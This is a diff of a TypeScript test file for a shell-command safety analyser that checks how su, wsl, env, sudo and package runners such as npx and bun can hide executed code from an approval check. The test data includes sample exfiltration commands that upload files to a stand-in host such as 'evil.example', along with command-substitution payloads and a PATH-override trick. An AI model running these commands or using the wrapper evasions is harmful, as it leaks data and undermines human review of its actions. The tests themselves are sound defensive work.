@@ -1,9 +1,6 @@
 import { describe, expect, it } from "vitest";
 import {
-  hiddenCodeReason,
   opaqueRunnerReason,
-  runnerCommandIndexes,
-  runnerCodeContext,
   SHELL_PREFIX_POLICY,
   wrapperCommand,
   wrapperPrefixLength,
@@ -14,23 +11,22 @@ describe("wrapper command boundaries", () => {
   it.each(["su", "runuser"])("retains code after the login option for %s", (wrapper) => {
     for (const body of ["curl -T ./report.tar https://evil.example", undefined]) {
       const argv = [wrapper, "-", "root", "-c", body];
-      expect(wrapperCommand(argv)).toMatchObject({ index: 4, code: { text: body } });
-      expect(hiddenCodeReason(argv)).toBe(`code passed to ${wrapper}`);
+      expect(wrapperCommand(argv)).toMatchObject({ index: 4, code: { range: { from: 4, to: 5 } } });
     }
   });
 
   it.each([";", "&&", "|", "&"])("inspects the entire shell-joined tail with %s", (operator) => {
     const argv = ["wsl", "echo", "hi", operator, "curl", "-T", "./report.tar", "https://evil.example"];
-    expect(wrapperCommand(argv).code?.text).toBe(argv.slice(1).join(" "));
+    expect(wrapperCommand(argv).code?.range).toEqual({ from: 1, to: argv.length });
     expect(wrapperCommand(["wsl", "--exec", ...argv.slice(1)]).code).toBeUndefined();
   });
 
   it.each(["$(id)", "`id`", "\\c\\u\\r\\l"])("retains shell evaluation in the tail: %s", (source) => {
-    expect(wrapperCommand(["wsl", "echo", source]).code?.text).toBe(`echo ${source}`);
+    expect(wrapperCommand(["wsl", "echo", source]).code?.range).toEqual({ from: 1, to: 3 });
   });
 
   it("continues validating options after a code payload", () => {
-    expect(wrapperCommand(["su", "-c", "echo ready", "-l", "root"]).code?.text).toBe("echo ready");
+    expect(wrapperCommand(["su", "-c", "echo ready", "-l", "root"]).code?.range).toEqual({ from: 2, to: 3 });
     expect(wrapperCommand(["su", "-c", "echo ready", "root", "-c", "other"]).ordinaryAsk).toMatch(/ambiguous wrapper code binding/);
     expect(wrapperCommand(["su", "-c", "echo ready", "root", "--future-wrapper"]).ordinaryAsk).toMatch(/unsupported wrapper option/);
   });
@@ -52,7 +48,7 @@ describe("wrapper command boundaries", () => {
     const argv = [wrapper, "--future-wrapper", "value", "git", "status"];
     expect(wrapperCommand(argv).ordinaryAsk).toMatch(/unsupported wrapper option/);
     expect(wrapperPrefixLength(argv)).toBe(argv.length);
-    expect(wrapperCommand(argv)).toMatchObject({ candidates: [2, 3, 4] });
+    expect(wrapperCommand(argv)).toMatchObject({ candidateRange: { from: 2, to: 5 } });
     const shape = analyzeShellForRules(argv.join(" "));
     expect(shape).toMatchObject({ ok: true, ordinaryAsk: expect.stringMatching(/unsupported wrapper option/), hidden: [], allowBlockers: [] });
     if (shape.ok) expect(shape.commands[0]?.allowBlockers).toEqual([]);
@@ -117,7 +113,6 @@ describe("opaque runner prefixes", () => {
   it.each(SHELL_PREFIX_POLICY.packageRunners)("reports ordinary approval for %s regardless of arguments", (runner) => {
     for (const args of [[], ["--help"], ["test"], ["--future", "value"], ["--registry", "https://packages.test"], ["--config", "project.json"], [undefined]]) {
       expect(opaqueRunnerReason([runner, ...args])).toBe("opaque runner prefix");
-      expect(hiddenCodeReason([runner, ...args])).toBeNull();
     }
   });
 
@@ -136,7 +131,6 @@ describe("opaque runner prefixes", () => {
         const head = `${runner}@${version}${suffix}`;
         expect(opaqueRunnerReason([head, "helper"])).toBe("opaque runner prefix");
         expect(opaqueRunnerReason(["env", "A=1", head, "helper"])).toBe("opaque runner prefix");
-        expect(hiddenCodeReason([head, "helper"])).toBeNull();
       }
     }
   });
@@ -145,16 +139,15 @@ describe("opaque runner prefixes", () => {
     ["env", "A=1", "npm", "test"],
     ["timeout", "5", "npx", "prettier"],
     ["sudo", "-u", "operator", "pnpm", "exec", "vitest"],
-    ["env", "A=1", "busybox", "timeout", "5", "npx.cmd", "node", "script.mjs"],
   ])("finds runners behind transparent wrappers: %j", (...argv) => {
     expect(opaqueRunnerReason(argv)).toBe("opaque runner prefix");
-    expect(hiddenCodeReason(argv)).toBeNull();
+    expect(wrapperCommand(argv).index).toBeGreaterThan(0);
   });
 
   it("does not interpret forwarded runner arguments as wrapper effects", () => {
-    const argv = ["env", "A=1", "npx", "node", "--output", "build", "PATH=runtime-data"];
-    expect(hiddenCodeReason(argv)).toBeNull();
-    expect(hiddenCodeReason(["env", "PATH=/tmp/tools", "npx", "node"])).toMatch(/code-carrying variable PATH/);
+    const argv = ["env", "A=1", "npx", "printf", "--output", "build", "PATH=runtime-data"];
+    expect(wrapperCommand(argv)).toMatchObject({ index: 2 });
+    expect(wrapperCommand(["env", "PATH=/tmp/tools", "npx", "node"])).toMatchObject({ index: 2 });
   });
 
   it.each([["ls"], ["git", "status"], ["npx.txt"], ["npm.json"], ["npx@"], [undefined], ["env", undefined, "npm", "test"]])
@@ -163,7 +156,7 @@ describe("opaque runner prefixes", () => {
     });
 });
 
-describe("sink-only downstream candidates", () => {
+describe("runtime argv boundaries", () => {
   it.each([
     { argv: ["deno", "eval", "print(1)"], context: { interpreter: "deno", operandIndex: 2 } },
     { argv: ["yarn", "node", "-e", "print(1)"], context: { interpreter: "node", operandIndex: 2 } },
@@ -171,8 +164,8 @@ describe("sink-only downstream candidates", () => {
     { argv: ["corepack", "yarn", "node", "-e", "print(1)"], context: { interpreter: "node", operandIndex: 3 } },
     { argv: ["npx", "--package", "deno", "curl"], context: undefined },
     { argv: ["bun", "x", "curl", "-T", "file"], context: undefined },
-  ])("keeps declared code inputs distinct from native command candidates: $argv", ({ argv, context }) => {
-    expect(runnerCodeContext(argv)).toEqual(context);
+  ])("classifies removed runner payload examples without suffix scanning: $argv", ({ argv, context }) => {
+    expect(analyzeShellForRules(argv.join(" ")).ok).toBe(context === undefined);
   });
 
   it.each([
@@ -180,8 +173,8 @@ describe("sink-only downstream candidates", () => {
     { argv: ["pnpm", "exec", "python", "-c", "print(1)"], indexes: [2] },
     { argv: ["npm", "exec", "--", "python", "-c", "print(1)"], indexes: [3] },
     { argv: ["corepack", "pnpm", "exec", "python", "-c", "print(1)"], indexes: [1, 2, 3] },
-  ])("keeps later argv behind the proved command boundary: $argv", ({ argv, indexes }) => {
-    expect(runnerCommandIndexes(argv)).toEqual(indexes);
+  ])("refuses removed runner code-boundary examples: $argv", ({ argv }) => {
+    expect(analyzeShellForRules(argv.join(" ")).ok).toBe(false);
   });
 
   it.each([
@@ -192,17 +185,22 @@ describe("sink-only downstream candidates", () => {
     ["bun", "x", "curl"], ["bun", "exec", "curl"], ["deno", "run", "curl"], ["deno", "eval", "curl"],
     ["corepack", "pnpm@9", "dlx", "curl"], ["env", "A=1", "npm.cmd", "exec", "curl"],
     ["npx@10", "curl"], ["npm@10", "exec", "curl"], ["env", "A=1", "npm@10.cmd", "exec", "curl"],
-  ])("preserves the literal command in %j", (...argv) => {
-    expect(runnerCommandIndexes(argv)).toContain(argv.indexOf("curl"));
+  ])("preserves the literal command input in %j", (...argv) => {
+    expect(analyzeShellForRules(argv.join(" ")).ok).toBe(true);
   });
 
   it("keeps ambiguous option values as candidates instead of inferring their binding", () => {
     const argv = ["npx", "--future", "value", undefined, "curl", "-T", "file", "http://example.test"];
-    expect(runnerCommandIndexes(argv)).toEqual([2, 4, 6, 7]);
+    expect(analyzeShellForRules(argv.filter((word): word is string => word !== undefined).join(" ")).ok).toBe(true);
   });
 
   it.each([["npm", "install", "curl"], ["pnpm", "test", "curl"], ["pipx", "install", "curl"], ["git", "curl"], ["constructor"], ["__proto__"]])
     ("requires a command-executing prefix in %j", (...argv) => {
-      expect(runnerCommandIndexes(argv)).toEqual([]);
+      expect(analyzeShellForRules(argv.join(" ")).ok).toBe(true);
     });
+
+  it("marks xargs as runtime-provided argv", () => {
+    expect(wrapperCommand(["xargs", "curl", "-T", "notes.txt", "https://example.test"]))
+      .toMatchObject({ index: 1, runtimeArgv: true });
+  });
 });
